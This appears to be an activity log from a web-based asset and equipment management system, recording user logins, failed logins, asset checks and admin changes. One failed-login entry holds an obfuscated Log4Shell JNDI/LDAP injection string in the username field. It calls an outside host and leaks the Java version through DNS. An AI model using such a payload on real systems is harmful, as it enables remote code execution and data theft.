2026/06/22 16:28:49,system,Failed login attempt for username: jamiec
2026/06/22 16:28:54,system,Failed login attempt for username: jamiec
2026/06/22 16:29:22,system,Failed login attempt for username: jamiec
2026/06/22 17:02:57,system,Failed login attempt for username: jamie
2026/06/22 17:03:01,system,Failed login attempt for username: jamie
2026/06/23 09:53:13,rrafie,User rrafie logged in via web interface
2026/06/23 09:54:35,rrafie,User rrafie logged in via web interface
2026/06/23 10:02:24,system,Failed login attempt for username: ${${h:mh:b:-j}${c:-n}${y:7h2x:685a:-d}${490:-i}${94yi:-:}${sc:-l}${n:za:64zr:-d}${dn5y:-a}${fba:-p}${0s4m:vi:-:}${ycj:4l:-/}${n:zh:06:-/}${5s:e:z73j:-U}${ru:02c:-N}${h8l:rw:lury:-l}${ny2g:flho:-0}${t:-c}${4:3rc:egfo:--}${${t:-s}${1q:c6a9:z9:-y}${1vgu:-s}${tk7o:db:-:}${f:z:-j}${nzdp:ob:y:-a}${wxd:-v}${yjk:-a}${ush:d:kt6:-.}${2h:mxjh:-v}${2x:4zti:-e}${k:5eo:-r}${6c:-s}${x:-i}${xy1:0d:6uqy:-o}${2:q:-n}}${1th:-.}${9qe:2f3m:73i:-8}${f:i:7zk:-0}${gvd:mgt5:-d}${kp:-7}${1uy:-b}${t:wgx:1u9w:-0}${xm08:-2}${jus:-9}${3e9:-8}${6c:fkq:a:-b}${x:-b}${u2m8:m:ulpx:-9}${10yf:-b}${z2:-d}${l7:-1}${mre2:se:-e}${m:y7t:9h:-4}${tg8j:5:-0}${7t40:-3}${hcxn:p:-4}${94:-a}${6:lf:6:-0}${9:-6}${xyb:hpt8:-5}${r1:r0:-7}${ys83:6oa:w:-5}${s1n4:1zn:3m4:-5}${4whe:qjp:-a}${1a:br:-8}${i62:las:z84:-a}${umg:g:-d}${ag:-0}${xf:xd:-3}${hb:l:-3}${0wr:hjgl:jw:-8}${9f5:qv7o:75qp:-f}${v6o:e:-d}${xy0:-9}${36:d:-0}${yxa1:-e}${rm:6r0n:-2}${r0:-a}${xnrp:9qjp:-.}${uqn2:-d}${a:5f:-n}${65:-s}${1:5o:7hn:--}${f:kv4:pi:-e}${do:e:cv:-x}${8mok:-f}${on7:7:zvo0:-i}${enw:2:4:-l}${1:cyw:uid:-.}${nes:jo6:-m}${2:8gfw:ymp:-a}${4pt1:-s}${9t:0:y:-m}${5:-c}${7vb:-o}${h:zwxp:kaeq:-r}${uw91:f:-e}${4esd:9t:--}${mis:h:-c}${b:b4:-f}${mt:--}${nqx7:-p}${x:q:-r}${x:m:04:-o}${h:ixu:-d}${0s:olkz:--}${uf7:fyln:-0}${c:6:fm:-2}${a:od:4iu:-.}${0f:d5r:-m}${cehm:r:q81s:-a}${4b:-s}${4per:2ag:-m}${jv:l:-.}${6x:-c}${j82:rz:-l}${c89:-o}${6s0:-u}${gh:7u4:zg:-d}${1xas:a7oi:-f}${9nz5:-e}${s:oi3:-r}${41b2:8w9r:cdv:-r}${2:-y}${kxf:-.}${wme:-g}${8g:-o}${34v6:7:to:-o}${i97c:-g}}
2026/06/23 10:30:11,bnjm2000,User bnjm2000 logged in via web interface
2026/06/23 10:43:54,bnjm2000,User bnjm2000 logged in via web interface
2026/06/23 12:17:48,rrafie,User rrafie logged in via web interface
2026/06/23 14:35:21,bnjm2000,"Maintenance logged for asset C1ProRHS#07: Headset foam torn, replaced"
2026/06/23 14:35:32,bnjm2000,"Updated maintenance log for asset C1ProRHS#07: 'Headset foam torn, replaced' -> 'Headset foam torn, replaced' (edited by bnjm2000)"
2026/06/23 14:51:13,bnjm2000,Added asset LIMITIMER#01 via web interface
2026/06/23 15:05:44,bnjm2000,User bnjm2000 logged in via web interface
2026/06/24 11:35:41,rrafie,User rrafie logged in via web interface
2026/06/25 10:18:06,cterence,User cterence logged in via web interface
2026/06/25 10:33:45,rrafie,User rrafie logged in via web interface
2026/06/25 10:43:30,tjacky,User tjacky logged in via web interface
2026/06/25 11:48:57,bnjm2000,Created company TSC (The Show Company)
2026/06/25 11:49:19,bnjm2000,Created company AEE (Avery Events and Exhibitions)
2026/06/25 11:49:38,bnjm2000,Created user nbenjamin
2026/06/25 11:49:50,bnjm2000,User bnjm2000 logged out from web interface
2026/06/25 11:51:07,bnjm2000,User bnjm2000 logged in via web interface
2026/06/25 11:51:44,bnjm2000,Deleted user nbenjamin
2026/06/25 12:05:26,bnjm2000,Deleted company TSC (The Show Company)
2026/06/25 12:05:51,bnjm2000,Created company TSC (The Show Company)
2026/06/25 12:05:56,bnjm2000,User bnjm2000 logged out from web interface
2026/06/25 12:06:17,bnjm2000,User bnjm2000 logged in via web interface
2026/06/25 12:06:33,bnjm2000,Deleted company TSC (The Show Company)
2026/06/25 12:06:47,bnjm2000,Created company TSC (The Show Company)
2026/06/25 12:56:41,rrafie,User rrafie logged in via web interface
2026/06/25 14:09:05,bnjm2000,Updated client Adityan Sohien
2026/06/25 15:42:44,rrafie,User rrafie logged in via web interface
2026/06/25 15:44:15,rrafie,Asset Check sighted asset 4099#06
2026/06/25 15:44:53,rrafie,Asset Check sighted asset 4099#17
2026/06/25 15:45:20,rrafie,Asset Check sighted asset 4099#04
2026/06/25 15:45:39,rrafie,Asset Check sighted asset 4099#16
2026/06/25 15:45:52,rrafie,Asset Check sighted asset 4099#11
2026/06/25 15:47:00,rrafie,Asset Check sighted asset 4099#09
2026/06/25 15:47:39,rrafie,Asset Check sighted asset 4099#10
2026/06/25 15:48:36,rrafie,Asset Check sighted asset 4099#12
2026/06/25 15:48:59,rrafie,Asset Check sighted asset 4099#07
2026/06/25 15:50:15,rrafie,Asset Check sighted asset 4099#13
2026/06/25 15:52:30,rrafie,Asset Check sighted asset 4099#02
2026/06/25 15:52:35,rrafie,Asset Check sighted asset 4099#03
2026/06/25 15:53:14,rrafie,Asset Check sighted asset 4099#01
2026/06/25 15:53:20,rrafie,Asset Check sighted asset 4099#15
2026/06/25 16:00:39,bnjm2000,Added asset 4099#18 via web interface
2026/06/25 16:01:51,rrafie,Asset Check sighted asset 4099#08
2026/06/25 16:02:11,rrafie,Asset Check sighted asset 4099#14
2026/06/25 16:05:21,bnjm2000,Updated asset 4099#18; applyTo=single; updatedAssets=1; eventsUpdated=0; containersUpdated=0
2026/06/25 16:14:49,bnjm2000,Deleted asset 4099#18; containersUpdated=0; containerRefsRemoved=0; mediaDeleted=0
2026/06/25 16:23:56,bnjm2000,Reset password for user cjamie
2026/06/25 16:24:29,cjamie,User cjamie logged in via web interface
2026/06/25 16:25:00,cjamie,Changed own password
2026/06/25 17:24:17,bnjm2000,User bnjm2000 logged out from web interface
2026/06/25 18:58:07,bnjm2000,User bnjm2000 logged in via web interface
2026/06/26 16:24:07,bnjm2000,User bnjm2000 logged in via web interface
2026/06/26 16:27:33,bnjm2000,User bnjm2000 logged in via web interface
2026/06/26 16:29:23,bnjm2000,Updated container 5XT Case #01 (12 assets)
2026/06/26 16:29:31,bnjm2000,Updated container 5XT Case #01 (12 assets)
2026/06/26 16:37:01,bnjm2000,Updated user admin
2026/06/26 16:55:22,bnjm2000,User bnjm2000 logged out from web interface
2026/06/26 16:55:25,system,Failed login attempt for username: admin
2026/06/26 16:55:30,system,Failed login attempt for username: admin
2026/06/26 16:55:36,bnjm2000,User bnjm2000 logged in via web interface
2026/06/26 16:55:48,bnjm2000,Reset password for user admin
2026/06/26 16:55:50,bnjm2000,User bnjm2000 logged out from web interface
2026/06/26 17:13:13,bnjm2000,User bnjm2000 logged in via web interface
